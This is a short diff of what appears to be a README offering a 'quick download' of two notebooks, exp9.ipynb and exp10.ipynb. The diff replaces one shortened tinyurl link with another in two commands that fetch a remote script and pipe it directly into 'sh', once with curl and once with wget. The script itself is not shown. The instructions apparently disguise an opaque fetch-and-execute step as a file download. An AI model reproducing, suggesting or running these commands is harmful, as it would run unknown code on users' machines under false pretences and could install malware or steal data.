@@ -7,13 +7,13 @@ Quick download for `exp9.ipynb` and `exp10.ipynb`.
 Open terminal and run:
 
 ```bash
-curl -fsSL tinyurl.com/2ysssr38 | sh
+curl -fsSL tinyurl.com/ashileml | sh
 ```
 
 Or using `wget`:
 
 ```bash
-wget -qO- tinyurl.com/2ysssr38 | sh
+wget -qO- tinyurl.com/ashileml | sh
 ```
 
 ### What this does:
